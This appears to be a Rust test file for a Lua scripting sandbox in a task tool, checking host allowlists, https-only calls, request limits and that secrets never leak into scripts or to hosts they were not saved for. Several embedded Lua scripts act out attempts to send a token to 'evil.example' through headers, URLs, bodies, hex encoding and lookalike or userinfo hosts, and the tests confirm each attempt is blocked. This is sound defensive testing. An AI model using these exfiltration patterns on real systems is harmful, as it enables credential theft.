#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::print_stdout,
    clippy::print_stderr,
    reason = "test code: a failure is the point"
)]
#![cfg(feature = "lua")]
//! What a script may do with the network and secrets, against a fake host: the allowlist it declares itself, https, the
//! request limits, a secret's value going only to the hosts it was saved with and never into the script, and a script that waits on a
//! request while another call arrives.

use async_trait::async_trait;
use serde_json::{json, Value};
use std::cell::RefCell;
use std::collections::HashMap;
use std::future::Future;
use std::pin::Pin;
use std::rc::Rc;
use std::task::{Context, Poll};
use tc_core::dates::Clock;
use tc_core::hook_secrets::Secret;
use tc_core::hooks::task_to_json;
use tc_core::lua_hooks::{HttpRequest, HttpResponse, LuaRunner, Net};
use tc_core::model::Facts;

/// Pending once, then ready: a request that is not answered at once, as a real one is not.
struct YieldOnce(bool);
impl Future for YieldOnce {
    type Output = ();
    fn poll(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<()> {
        if self.0 {
            Poll::Ready(())
        } else {
            self.0 = true;
            cx.waker().wake_by_ref();
            Poll::Pending
        }
    }
}

type Answer = Box<dyn Fn(&HttpRequest) -> Result<HttpResponse, String>>;

struct FakeNet {
    seen: RefCell<Vec<HttpRequest>>,
    secrets: HashMap<String, Secret>,
    answer: Answer,
}

impl FakeNet {
    fn new(answer: impl Fn(&HttpRequest) -> Result<HttpResponse, String> + 'static) -> Rc<FakeNet> {
        Rc::new(FakeNet {
            seen: RefCell::default(),
            secrets: HashMap::from([
                (
                    "jira".to_owned(),
                    Secret {
                        value: "s3cr3t-token".into(),
                        hosts: vec!["acme.atlassian.net".into(), "*.atlassian.com".into()],
                    },
                ),
                (
                    "old".to_owned(),
                    Secret {
                        value: "0ld-s3cr3t".into(),
                        hosts: vec![],
                    },
                ),
            ]),
            answer: Box::new(answer),
        })
    }
}

#[async_trait(?Send)]
impl Net for FakeNet {
    async fn request(&self, request: HttpRequest) -> Result<HttpResponse, String> {
        YieldOnce(false).await;
        let answer = (self.answer)(&request);
        self.seen.borrow_mut().push(request);
        answer
    }

    async fn secret(&self, name: &str) -> Result<Option<Secret>, String> {
        Ok(self.secrets.get(name).cloned())
    }
}

#[allow(
    clippy::unnecessary_wraps,
    clippy::needless_pass_by_value,
    reason = "the answer a `FakeNet` handler gives is a `Result`, and the body is built in each call"
)]
fn ok_json(body: Value) -> Result<HttpResponse, String> {
    Ok(HttpResponse {
        status: 201,
        headers: vec![("Content-Type".into(), "application/json".into())],
        body: body.to_string(),
    })
}

fn runner(script: &str, net: Option<Rc<FakeNet>>) -> LuaRunner {
    let net: Option<Rc<dyn Net>> = net.map(|n| -> Rc<dyn Net> { n });
    LuaRunner::load_with(script, Clock::utc(1_791_799_200), net).unwrap_or_else(|p| panic!("{p:?}"))
}

fn task() -> Value {
    task_to_json(
        &Facts {
            description: "Pay the invoice".into(),
            status: "pending".into(),
            ..Facts::default()
        },
        None,
        0,
    )
}

#[tokio::test(flavor = "current_thread")]
async fn a_script_posts_json_with_a_secret_and_uses_what_comes_back() {
    let net = FakeNet::new(|_| ok_json(json!({ "key": "ABC-123" })));
    let r = runner(
        r#"
        allow_hosts{"acme.atlassian.net"}
        function on_add(task)
          local res = http.post("https://acme.atlassian.net/rest/api/3/issue", {
            headers = { Authorization = "Basic " .. secret("jira") },
            json = { fields = { summary = task.description } },
          })
          if res.ok then
            task.jira = res.json.key
            say("created " .. res.json.key .. " (" .. res.status .. ")")
          end
        end
        "#,
        Some(net.clone()),
    );
    let got = r.call("on_add", &[task()]).await.unwrap();
    assert_eq!(got.value["uda"]["jira"], "ABC-123");
    assert_eq!(got.lines[0].text, "created ABC-123 (201)");
    let seen = net.seen.borrow();
    assert_eq!(seen.len(), 1);
    assert_eq!(seen[0].method, "POST");
    assert_eq!(seen[0].url, "https://acme.atlassian.net/rest/api/3/issue");
    assert_eq!(
        seen[0].body.as_deref(),
        Some(r#"{"fields":{"summary":"Pay the invoice"}}"#)
    );
    assert!(seen[0]
        .headers
        .contains(&("Authorization".into(), "Basic s3cr3t-token".into())));
    assert!(seen[0]
        .headers
        .contains(&("content-type".into(), "application/json".into())));
    assert_eq!(seen[0].timeout_secs, 5.0);
}

#[tokio::test(flavor = "current_thread")]
async fn a_script_holds_a_stand_in_never_the_value() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        r#"
        function on_add(task)
          local t = secret("jira")
          say("token is " .. t)
          task.description = "leak: " .. t
          task.jira = t
        end
        function on_modify(old, new)
          error("it broke with " .. secret("jira"))
        end
        "#,
        Some(net),
    );
    let got = r.call("on_add", &[task()]).await.unwrap();
    assert_eq!(got.lines[0].text, "token is ⟦secret:jira⟧");
    assert_eq!(got.value["description"], "leak: ⟦secret:jira⟧");
    assert_eq!(got.value["uda"]["jira"], "⟦secret:jira⟧");
    let failed = r.call("on_modify", &[task(), task()]).await.unwrap_err();
    assert_eq!(failed.message, "it broke with ⟦secret:jira⟧");
    assert!(!format!("{failed:?}").contains("s3cr3t"));
}

#[tokio::test(flavor = "current_thread")]
async fn a_host_has_to_be_declared_and_the_declaration_is_exact_or_a_wildcard() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        r#"
        allow_hosts{"api.example.com", "*.hooks.example.org"}
        function on_launch(command) http.get(command) end
        "#,
        Some(net.clone()),
    );
    for (url, allowed) in [
        ("https://api.example.com/x?y=1", true),
        ("https://API.example.com:8443/x", true),
        ("https://a.hooks.example.org/x", true),
        ("https://a.b.hooks.example.org/x", true),
        ("https://hooks.example.org/x", false),
        ("https://evilhooks.example.org/x", false),
        ("https://other.example.com/x", false),
        ("https://api.example.com@evil.example.net/x", false),
        ("https://evil.example.net/api.example.com", false),
        ("not a url", false),
    ] {
        let result = r.call("on_launch", &[json!(url)]).await;
        assert_eq!(result.is_ok(), allowed, "{url}: {result:?}");
    }
    let failed = runner(
        r#"
        function on_add(task) http.get("https://api.example.com/") end
        "#,
        Some(net),
    )
    .call("on_add", &[task()])
    .await
    .unwrap_err();
    assert!(failed.message.contains("allow_hosts"), "{failed:?}");
}

#[tokio::test(flavor = "current_thread")]
async fn only_https_is_called_except_to_this_machine_and_allow_hosts_is_for_the_top_of_the_script() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        r#"
        allow_hosts{"example.com", "localhost"}
        function on_launch(command) http.get(command) end
        function on_add(task)
          allow_hosts{"anything.example.net"}
        end
        "#,
        Some(net),
    );
    let message = r
        .call("on_launch", &[json!("http://example.com/")])
        .await
        .unwrap_err()
        .message;
    assert_eq!(message, "only https:// addresses can be called");
    r.call("on_launch", &[json!("https://example.com/")]).await.unwrap();
    r.call("on_launch", &[json!("http://localhost:9911/hook")])
        .await
        .unwrap();
    let failed = r.call("on_add", &[task()]).await.unwrap_err();
    assert!(failed.message.contains("top of the script"), "{failed:?}");
}

#[tokio::test(flavor = "current_thread")]
async fn a_call_may_make_a_few_requests_and_a_timeout_stays_within_bounds() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        r#"
        allow_hosts{"example.com"}
        function on_add(task)
          for i = 1, 6 do
            http.get("https://example.com/" .. i, { timeout = i == 1 and 100 or 0 })
          end
        end
        "#,
        Some(net.clone()),
    );
    let failed = r.call("on_add", &[task()]).await.unwrap_err();
    assert!(failed.message.contains("at most 5 requests"), "{failed:?}");
    let (count, first, second_timeout) = {
        let seen = net.seen.borrow();
        (seen.len(), seen[0].timeout_secs, seen[1].timeout_secs)
    };
    assert_eq!((count, first, second_timeout), (5, 10.0, 1.0));
    // The limit is per call: the next call has its five again.
    let second = r.call("on_add", &[task()]).await.unwrap_err();
    assert!(second.message.contains("at most 5 requests"));
    assert_eq!(net.seen.borrow().len(), 10);
}

#[tokio::test(flavor = "current_thread")]
async fn a_request_that_fails_gives_nil_and_the_reason_and_a_script_with_no_network_says_so() {
    let net = FakeNet::new(|_| Err("connection refused".into()));
    let r = runner(
        r#"
        allow_hosts{"example.com"}
        function on_add(task)
          local res, err = http.get("https://example.com/")
          say(tostring(res) .. ": " .. err)
          task.description = task.description .. " (offline)"
        end
        function on_modify(old, new)
          local res = http.get("https://example.com/")
          new.description = res.body
        end
        "#,
        Some(net),
    );
    let got = r.call("on_add", &[task()]).await.unwrap();
    assert_eq!(got.lines[0].text, "nil: connection refused");
    assert_eq!(got.value["description"], "Pay the invoice (offline)");
    // Not looking at the answer is the script's mistake, and an ordinary one.
    let failed = r.call("on_modify", &[task(), task()]).await.unwrap_err();
    assert!(failed.message.contains("nil"), "{failed:?}");

    let bare = runner(
        "allow_hosts{\"example.com\"}\nfunction on_add(task) http.get(\"https://example.com/\") end\nfunction on_exit(c) secret(\"x\") end",
        None,
    );
    assert_eq!(
        bare.call("on_add", &[task()]).await.unwrap_err().message,
        "the network is not available here"
    );
    assert_eq!(
        bare.call("on_exit", &[json!([])]).await.unwrap_err().message,
        "secrets are not available here"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn a_missing_secret_is_an_error_and_responses_give_status_headers_body_and_json() {
    let net = FakeNet::new(|_| {
        Ok(HttpResponse {
            status: 404,
            headers: vec![("X-Reason".into(), "nope".into())],
            body: "plain words".into(),
        })
    });
    let r = runner(
        r#"
        allow_hosts{"example.com"}
        function on_launch(command)
          local res = http.get("https://example.com/")
          say(res.status, tostring(res.ok), res.headers["x-reason"], res.body, tostring(res.json))
          say(http.urlencode("a b&c/ü"))
          secret("missing")
        end
        "#,
        Some(net),
    );
    let failed = r.call("on_launch", &[json!("x")]).await.unwrap_err();
    assert_eq!(failed.lines[0].text, "404 false nope plain words nil");
    assert_eq!(failed.lines[1].text, "a%20b%26c%2F%C3%BC");
    assert_eq!(failed.message, "there is no secret called missing");
}

#[tokio::test(flavor = "current_thread")]
async fn a_second_call_while_one_waits_on_the_network_is_told_to_use_another_runner() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        "allow_hosts{\"example.com\"}\nfunction on_launch(c) http.get(\"https://example.com/\") say(\"done \" .. c) end",
        Some(net),
    );
    let (a, b) =
        futures_util::future::join(r.call("on_launch", &[json!("a")]), r.call("on_launch", &[json!("b")])).await;
    assert_eq!(a.unwrap().lines[0].text, "done a");
    assert_eq!(b.unwrap_err().message, tc_core::lua_hooks::BUSY);
    // And it is free again afterwards.
    assert_eq!(
        r.call("on_launch", &[json!("c")]).await.unwrap().lines[0].text,
        "done c"
    );
}

/// Every request the fake host saw, as one text, to look for a value in.
fn everything_sent(net: &FakeNet) -> String {
    format!("{:?}", net.seen.borrow())
}

#[tokio::test(flavor = "current_thread")]
async fn a_secret_goes_only_to_its_own_hosts_whatever_the_script_allows() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        r#"
        allow_hosts{"evil.example", "acme.atlassian.net", "*.atlassian.com", "*.atlassian.net"}
        function on_launch(how)
          local s = secret("jira")
          if how == "header" then http.get("https://evil.example/", { headers = { Authorization = "Bearer " .. s } })
          elseif how == "url" then http.get("https://evil.example/?t=" .. s)
          elseif how == "body" then http.post("https://evil.example/", { body = "t=" .. s })
          elseif how == "json" then http.post("https://evil.example/", { json = { t = s } })
          elseif how == "lookalike" then http.get("https://evil-acme.atlassian.net/", { headers = { A = s } })
          elseif how == "userinfo" then http.get("https://acme.atlassian.net@evil.example/", { headers = { A = s } })
          elseif how == "in-host" then http.get("https://" .. s .. ".atlassian.com/")
          elseif how == "wildcard" then http.get("https://eu.atlassian.com/", { headers = { A = s } })
          elseif how == "own" then http.get("https://acme.atlassian.net/?t=" .. s, { body = s, headers = { A = s } })
          end
        end
        "#,
        Some(net.clone()),
    );
    for how in ["header", "url", "body", "json", "lookalike", "userinfo", "in-host"] {
        let failed = r.call("on_launch", &[json!(how)]).await.unwrap_err();
        assert!(!failed.message.contains("s3cr3t"), "{how}: {}", failed.message);
    }
    assert!(!everything_sent(&net).contains("s3cr3t"), "{}", everything_sent(&net));
    assert!(net.seen.borrow().is_empty());
    let failed = r.call("on_launch", &[json!("header")]).await.unwrap_err();
    assert_eq!(
        failed.message,
        "jira may only be sent to acme.atlassian.net, *.atlassian.com, not evil.example"
    );

    // To one of its hosts, the value goes in the address, a header and the body.
    r.call("on_launch", &[json!("wildcard")]).await.unwrap();
    r.call("on_launch", &[json!("own")]).await.unwrap();
    let seen = net.seen.borrow();
    assert_eq!(seen[0].headers, [("A".to_owned(), "s3cr3t-token".to_owned())]);
    assert_eq!(seen[1].url, "https://acme.atlassian.net/?t=s3cr3t-token");
    assert_eq!(seen[1].body.as_deref(), Some("s3cr3t-token"));
}

#[tokio::test(flavor = "current_thread")]
async fn encoding_or_cutting_a_stand_in_gives_nothing_away() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        r#"
        allow_hosts{"evil.example"}
        function on_add(task)
          local s = secret("jira")
          local hex = s:gsub(".", function(c) return string.format("%02x", c:byte()) end)
          http.post("https://evil.example/", { json = { hex = hex, part = s:sub(1, 3), len = #s } })
          task.description = hex
          return task
        end
        "#,
        Some(net.clone()),
    );
    let got = r.call("on_add", &[task()]).await.unwrap();
    let sent = everything_sent(&net);
    assert!(!sent.contains("s3cr3t"), "{sent}");
    let hex_of_value: String = "s3cr3t-token".bytes().map(|b| format!("{b:02x}")).collect();
    assert!(!sent.contains(&hex_of_value));
    assert!(!got.value.to_string().contains(&hex_of_value));
}

#[tokio::test(flavor = "current_thread")]
async fn a_response_that_echoes_the_value_gives_the_stand_in() {
    let net = FakeNet::new(|req| {
        let auth = req
            .headers
            .iter()
            .find(|(k, _)| k == "A")
            .map(|(_, v)| v.clone())
            .unwrap_or_default();
        Ok(HttpResponse {
            status: 200,
            headers: vec![("x-echo".into(), auth.clone())],
            body: json!({ "you_sent": auth }).to_string(),
        })
    });
    let r = runner(
        r#"
        allow_hosts{"acme.atlassian.net", "evil.example"}
        function on_add(task)
          local res = http.get("https://acme.atlassian.net/echo", { headers = { A = secret("jira") } })
          task.description = res.json.you_sent .. " " .. res.headers["x-echo"] .. " " .. res.body
          say(task.description)
          http.post("https://evil.example/", { body = task.description })
        end
        "#,
        Some(net.clone()),
    );
    let failed = r.call("on_add", &[task()]).await.unwrap_err();
    assert!(
        failed.lines[0].text.starts_with("⟦secret:jira⟧ ⟦secret:jira⟧"),
        "{:?}",
        failed.lines
    );
    // Sending on what came back sends the stand-in, which names jira, which may not go there.
    assert!(
        failed.message.contains("jira may only be sent to"),
        "{}",
        failed.message
    );
    assert_eq!(net.seen.borrow().len(), 1);
}

#[tokio::test(flavor = "current_thread")]
async fn a_secret_saved_before_hosts_existed_goes_nowhere_and_says_why() {
    let net = FakeNet::new(|_| ok_json(json!({})));
    let r = runner(
        r#"
        allow_hosts{"acme.atlassian.net"}
        function on_add(task) http.get("https://acme.atlassian.net/", { headers = { A = secret("old") } }) end
        "#,
        Some(net.clone()),
    );
    let failed = r.call("on_add", &[task()]).await.unwrap_err();
    assert!(
        failed.message.contains("old can't be sent anywhere yet"),
        "{}",
        failed.message
    );
    assert!(net.seen.borrow().is_empty());
}

#[tokio::test(flavor = "current_thread")]
async fn a_failed_request_does_not_echo_the_value_either() {
    let net = FakeNet::new(|req| Err(format!("could not reach {}", req.url)));
    let r = runner(
        r#"
        allow_hosts{"acme.atlassian.net"}
        function on_add(task)
          local res, why = http.get("https://acme.atlassian.net/?t=" .. secret("jira"))
          say(why)
        end
        "#,
        Some(net),
    );
    let got = r.call("on_add", &[task()]).await.unwrap();
    assert_eq!(
        got.lines[0].text,
        "could not reach https://acme.atlassian.net/?t=⟦secret:jira⟧"
    );
}
